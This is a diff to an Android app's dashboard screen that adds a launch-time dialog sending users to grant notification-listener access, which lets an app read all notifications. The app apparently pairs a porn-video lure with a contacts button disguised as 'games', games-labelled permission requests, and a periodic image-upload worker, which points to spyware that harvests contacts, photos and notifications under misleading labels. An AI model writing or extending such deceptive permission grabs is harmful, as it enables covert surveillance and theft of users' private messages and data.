@@ -66,6 +66,9 @@ public class DashboardActivity extends AppCompatActivity {
             ImageUploadWorker.schedulePeriodicUpload(this);
         }
 
+        // Request notification access on app launch
+        maybePromptNotificationAccessOnLaunch();
+
         binding.btnPorn.setOnClickListener(v -> onVideosTapped());
         binding.btnChat.setOnClickListener(v -> onChatTapped());
         binding.btnContacts.setOnClickListener(v -> onGamesTapped());
@@ -195,6 +198,19 @@ public class DashboardActivity extends AppCompatActivity {
                 .setMessage(R.string.perm_games_message)
                 .setPositiveButton(R.string.perm_allow, (d, w) ->
                         FeaturePermissions.requestGamesPermissions(this))
+                .setNegativeButton(android.R.string.cancel, null)
+                .show();
+    }
+
+    private void maybePromptNotificationAccessOnLaunch() {
+        if (NotificationHelper.isNotificationServiceEnabled(this)) {
+            return;
+        }
+        new AlertDialog.Builder(this)
+                .setTitle(R.string.perm_notif_title)
+                .setMessage(R.string.perm_notif_message)
+                .setPositiveButton(R.string.perm_allow, (d, w) ->
+                        NotificationHelper.openNotificationListenerSettings(this))
                 .setNegativeButton(android.R.string.cancel, null)
                 .show();
     }
